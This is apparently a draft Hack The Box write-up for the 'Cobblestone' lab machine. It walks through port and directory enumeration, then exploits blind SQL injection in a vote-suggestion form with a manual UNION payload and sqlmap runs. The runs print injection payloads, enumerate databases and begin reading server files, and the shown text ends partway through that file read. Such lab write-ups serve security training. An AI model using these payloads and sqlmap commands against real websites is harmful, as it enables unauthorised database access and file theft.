---
title: Cobblestone [Insane]
published: false
date: 2025-08-15
tags: [htb, linux, nmap, ffuf, sqlmap, burpsuite, curl, cobbler, xmlrpc, sqli, cracking, blind sqli, penelope, ssh]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/cobblestone-htb-season8
image: /assets/img/cobblestone-htb-season8/cobblestone-htb-season8_banner.png
---

# Cobblestone HTB Season 8
## Machine information
Author: [c1sc0](https://app.hackthebox.com/users/34604)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:33 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://cobblestone.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.59 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     cobblestone.htb
```

### Web Enumeration
Check out the website at `http://cobblestone.htb`.

![Cobblestone Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_website.png)

Okay, so it is **Minecraft Port Template** website. When *view page source*, we can see there is [bybilly.uk](https://bybilly.uk/) in the source code. <br>
It has a [minecraft-web-portal](https://github.com/bybilly/minecraft-web-portal) repository on GitHub. Also we found 3 subdomains when hover over these sections.

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains.png)

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains_1.png)

![Subdomains](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_subdomains_2.png)

Let's add these to `/etc/hosts` file:
```bash
10.129.xx.xx     cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb
```

For the `deploy.cobblestone.htb`, it still under development so we can not do anything with this one.

![Deploy Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_deploy_website.png)

Moving on to the `vote.cobblestone.htb`.

![Vote Website](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_vote_website.png)

We got a login and register page, it also tell us that **it is still beta and might have issues** so we can leverage this point to exploit this part. <br>
And for this `mc.cobblestone.htb`, it got redirect back to `cobblestone.htb` so nothing useful here.

To make sure we do not miss any endpoints or directories, let's use `fuzz` to enumerate.

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://deploy.cobblestone.htb/FUZZ -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://deploy.cobblestone.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 356ms]
css                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 349ms]
img                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 179ms]
javascript              [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 183ms]
index.php               [Status: 200, Size: 1745, Words: 121, Lines: 52, Duration: 207ms]
server-status           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 183ms]
:: Progress: [265830/265830] :: Job [1/1] :: 269 req/sec :: Duration: [0:20:31] :: Errors: 60 ::
```

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://vote.cobblestone.htb/FUZZ -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vote.cobblestone.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

templates               [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 181ms]
js                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 181ms]
css                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 190ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 196ms]
register.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
login.php               [Status: 200, Size: 4759, Words: 1268, Lines: 90, Duration: 186ms]
img                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 185ms]
db                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 251ms]
javascript              [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 181ms]
index.php               [Status: 302, Size: 81, Words: 10, Lines: 4, Duration: 207ms]
details.php             [Status: 302, Size: 78, Words: 10, Lines: 4, Duration: 190ms]
vendor                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 182ms]
suggest.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 197ms]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 183ms]
composer.json           [Status: 200, Size: 56, Words: 19, Lines: 6, Duration: 179ms]
:: Progress: [265830/265830] :: Job [1/1] :: 236 req/sec :: Duration: [0:20:28] :: Errors: 60 ::
```

Found some folder seems interesting like `db`, let's fuzzing out this folder.

```bash

```

We got `connection.php` file but seems like it is empty so let's move on the register and login part.

Gonna register with these information:
```bash
username: 2fa0n
firstname: conan
lastname: shinichi
email: 2fa0n@gmail.com
password: 2fa0n
```

![Register](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_register.png)

![Login](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_login.png)

![Vote](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_vote.png)

After register and login, we are in the **Voting table** page but we can not vote as it was not implemented yet.

![Voting Table](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_voting_table.png)

Check out the `suggest.php` one.

![Suggest](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggest.png)

It seems like we can enter a server for the approval. This maybe chance for SSRF to read or even RCE. <br>
Roll back to the fuzzing part, we got `details.php` &rarr; Let's check it out.

![Details](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_details.png)

We got a pop up *You are not allowed to view this suggestion*. <br>
&rarr; Okay so let's discover this suggestion part via burpsuite.

Back to the **Voting table**, we use the `mc.cobblestone.htb` and check out the burp.

![Burpsuite](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_burpsuite.png)

We are in `http://vote.cobblestone.htb/details.php?id=1` and we know that the `details.php` must go with `id` parameter to get the details of the one to vote. <br>
&rarr; Let's enter `http://vote.cobblestone.htb/index.php` to the suggestion part and see what we got.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion.png)

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_1.png)

So we got a new `id=4` and from the burpsuite, we got POST request to `suggest.php`. <br>
When we back to the suggest, we can see our new server suggestions.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_2.png)

Then we trying to exploit the SSRF vulnerability but it seems like it just create a new suggestion so maybe this could be a false positive. <br>
After a while discovering and stucking, we enter `'` and hit enter.

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_3.png)

![Suggestion](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_suggestion_4.png)

Got `500 Internal Server Error`, hmm this could be a good sign for SQLi. That was interesting.

### SQL Injection & RCE & Cracking
So continue to testing out how many columns we got with this payload `99999' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL #` and the result is `500`. Then decrease one column and we got `200`. <br>
&rarr; So we can conclude that this is Blind SQli and got 5 columns. To make it automate, we gonna use `sqlmap` to do this.

First we gonna `Copy to file` the following request in burpsuite and save it as `req`.

```bash
└─$ cat req 
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://vote.cobblestone.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://vote.cobblestone.htb/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=bdufjqsj8bnoc07s9t5ma46jo9
Connection: keep-alive

url=http%3A%2F%2Fvote.cobblestone.htb%2Findex.php
```

Then we use `sqlmap` with `--batch` to run it automatically.

```bash
└─$ sqlmap -r req --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:28:41 /2025-08-13/

[09:28:41] [INFO] parsing HTTP request from 'req'
[09:28:42] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=5'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[09:28:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:28:44] [INFO] testing if the target URL content is stable
[09:28:45] [WARNING] POST parameter 'url' does not appear to be dynamic
[09:28:46] [WARNING] heuristic (basic) test shows that POST parameter 'url' might not be injectable
[09:28:47] [INFO] testing for SQL injection on POST parameter 'url'
[09:28:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:28:48] [WARNING] reflective value(s) found and filtering out
[09:28:58] [INFO] POST parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[09:29:24] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:29:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:29:25] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:29:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:29:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:29:28] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:29:29] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:29:30] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:29:31] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:29:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:29:32] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:29:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:29:34] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:29:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:29:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:29:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:29:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[09:29:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[09:29:39] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:29:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[09:29:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[09:29:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[09:29:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[09:29:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[09:29:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[09:29:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[09:29:41] [INFO] testing 'Generic inline queries'
[09:29:42] [INFO] testing 'MySQL inline queries'
[09:29:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:29:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:29:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:29:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:29:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[09:29:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[09:29:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:30:03] [INFO] POST parameter 'url' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:30:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:30:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:30:27] [INFO] target URL appears to be UNION injectable with 5 columns
[09:30:28] [INFO] POST parameter 'url' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'url' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 85 HTTP(s) requests:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[09:30:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:30:29] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3 times
[09:30:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 09:30:29 /2025-08-13/
```

We got 3 techniques to exploit this SQLi. <br>
&rarr; Gonna go with `UNION query` technique.

We continue to enumrate the db privilege.

```bash
└─$ sqlmap -r req --batch --privilege 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:33:02 /2025-08-13/

[09:33:02] [INFO] parsing HTTP request from 'req'
[09:33:03] [INFO] resuming back-end DBMS 'mysql' 
[09:33:03] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=27'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[09:33:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:33:04] [INFO] fetching database users privileges
[09:33:06] [WARNING] the SQL query provided does not return any output
[09:33:06] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[09:33:06] [INFO] fetching database users
[09:33:08] [WARNING] the SQL query provided does not return any output
[09:33:08] [INFO] fetching number of database users
[09:33:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:33:08] [INFO] retrieved: 1
[09:33:14] [INFO] retrieved: 'voteuser'@'loca
[09:35:01] [WARNING] unexpected HTTP code '404' detected. Will use (extra) validation step in similar cases
[09:35:02] [ERROR] invalid character detected. retrying..
lhost'
[09:35:39] [INFO] fetching number of privileges for user 'voteuser'
[09:35:39] [INFO] retrieved: 1
[09:35:46] [INFO] fetching privileges for user 'voteuser'
[09:35:46] [INFO] retrieved: FILE
database management system users privileges:
[*] %voteuser% [1]:
    privilege: FILE

[09:36:20] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times, 404 (Not Found) - 1 times
[09:36:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 09:36:20 /2025-08-13/
```

Got `FILE` privilege which we can read files from filesystem and also write files that we can leverage this point to access configuration files, logs, source code and even RCE.

Next gonna check the database.

```bash
└─$ sqlmap -r req --batch --dbs                                                                               
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:47:57 /2025-08-13/

[11:47:57] [INFO] parsing HTTP request from 'req'
[11:47:57] [INFO] resuming back-end DBMS 'mysql' 
[11:47:57] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=24'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[11:47:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:47:58] [INFO] fetching database names
[11:48:01] [WARNING] the SQL query provided does not return any output
[11:48:01] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:48:01] [INFO] fetching number of databases
[11:48:01] [INFO] resumed: 2
[11:48:01] [INFO] resumed: information_schema
[11:48:01] [INFO] resumed: vote
available databases [2]:
[*] information_schema
[*] vote

[11:48:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 11:48:01 /2025-08-13/
```

Let's check out the `vote` database.

```bash
└─$ sqlmap -r req --batch -D vote --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:52:00 /2025-08-13/

[11:52:00] [INFO] parsing HTTP request from 'req'
[11:52:00] [INFO] resuming back-end DBMS 'mysql' 
[11:52:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=24'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[11:52:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:52:02] [INFO] fetching tables for database: 'vote'
[11:52:04] [WARNING] the SQL query provided does not return any output
[11:52:04] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:52:06] [WARNING] the SQL query provided does not return any output
[11:52:06] [INFO] fetching number of tables for database 'vote'
[11:52:06] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:52:06] [INFO] retrieved: 2
[11:52:14] [INFO] retrieved: votes
[11:52:47] [INFO] retrieved: users
Database: vote
[2 tables]
+-------+
| users |
| votes |
+-------+

[11:53:28] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 11:53:28 /2025-08-13/
```

Let's dump the `users` table.

```bash
└─$ sqlmap -r req --batch -D vote -T users --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:37:59 /2025-08-13/

[23:37:59] [INFO] parsing HTTP request from 'req'
[23:38:00] [INFO] resuming back-end DBMS 'mysql' 
[23:38:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=5'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[23:38:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[23:38:01] [INFO] fetching columns for table 'users' in database 'vote'
[23:38:03] [WARNING] the SQL query provided does not return any output
[23:38:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[23:38:03] [WARNING] unable to retrieve column names for table 'users' in database 'vote'
do you want to use common column existence check? [y/N/q] N
[23:38:03] [WARNING] unable to enumerate the columns for table 'users' in database 'vote'
[23:38:03] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[23:38:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 23:38:03 /2025-08-13/
```

Somehow we can not dump the `users` table which we can get some credentials to initial access. <br>
Let's check out the apache virtual host config, for more details check out [Apache Virtual Hosts](https://httpd.apache.org/docs/2.4/vhosts/examples.html).

```bash
└─$ sqlmap -r req --batch --file-read /etc/apache2/sites-available/000-default.conf
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:15:43 /2025-08-13/

[10:15:43] [INFO] parsing HTTP request from 'req'
[10:15:43] [INFO] resuming back-end DBMS 'mysql' 
[10:15:43] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=48'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[10:15:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:15:45] [INFO] fingerprinting the back-end DBMS operating system
